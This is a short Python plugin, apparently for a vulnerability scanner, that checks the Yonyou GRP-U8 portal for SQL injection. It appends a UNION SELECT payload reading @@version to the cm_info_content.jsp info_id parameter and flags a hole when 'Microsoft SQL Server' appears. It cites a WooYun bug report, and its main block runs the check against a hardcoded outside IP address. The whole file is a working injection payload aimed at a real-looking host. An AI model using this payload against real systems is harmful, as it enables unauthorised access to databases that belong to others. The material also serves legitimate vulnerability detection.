#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name:用友  GRP-U8 sql注入漏洞 

#Refer: http://www.wooyun.org/bugs/wooyun-2010-0159096


def assign(service,arg):
    if service=="yongyou_u8":
        return True,arg

def audit(arg):
    vun_url=arg+"R9iPortal/cm/cm_info_content.jsp?info_id=-12"
    payload="%20UNION%20ALL%20SELECT%2067,67,@@version,67,67,67,67,67,67,67,67,67,67,67--"
    code,head,res,errcode,finalurl=curl.curl2(vun_url+payload)
    if code==200 and  "Microsoft SQL Server" in res:
        security_hole("sql inject "+vun_url)

if  __name__=="__main__":
    from  dummy import *
    audit(assign('yongyou_u8','http://221.2.68.102:8888/')[1])